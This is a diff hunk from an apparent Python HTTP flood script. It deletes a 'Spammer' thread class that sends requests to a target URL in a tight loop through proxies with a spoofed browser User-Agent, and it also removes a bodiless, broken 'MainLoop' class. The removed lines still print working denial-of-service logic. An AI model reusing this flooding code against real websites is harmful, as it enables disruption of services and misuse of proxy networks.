@@ -195,45 +195,6 @@ headers.close()
 q = Queue()
 w = Queue()
 
-class Spammer(threading.Thread):
-   
-    def __init__(self, url, number, proxy):
-        threading.Thread.__init__(self)
-        self.url = url
-        self.num = number
-        self.headers = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
-        self.Lock = threading.Lock()
-        self.proxy = proxy
- 
- 
-    def request(self):
-        data = None
-        proxy = urllib.request.ProxyHandler({'http': self.proxy})
-        opener = urllib.request.build_opener(proxy)
-        urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
-        sys.stdout.write("Thread #%s Proxy@%s"%(self.num, self.proxy))
-           
-    def run(self):
-        global Close, Request, Tot_req
-        self.Lock.acquire()
-        print ('Starting thread #{0}'.format(self.num))
-        self.Lock.release()
-        time.sleep(1)
-        while True:
-            try:
-                self.request()
-            except:
-                sys.stdout.write("Thread #%s Connection Proxy Lost...exiting\n"%(self.num))
-                sys.exit(0)
-        sys.exit(0)
- 
- 
-class MainLoop():
-
-if __name__ == '__main__':
-    MainLoop().home()
 
 if __name__ == '__main__':
 	if len(sys.argv) < 2:
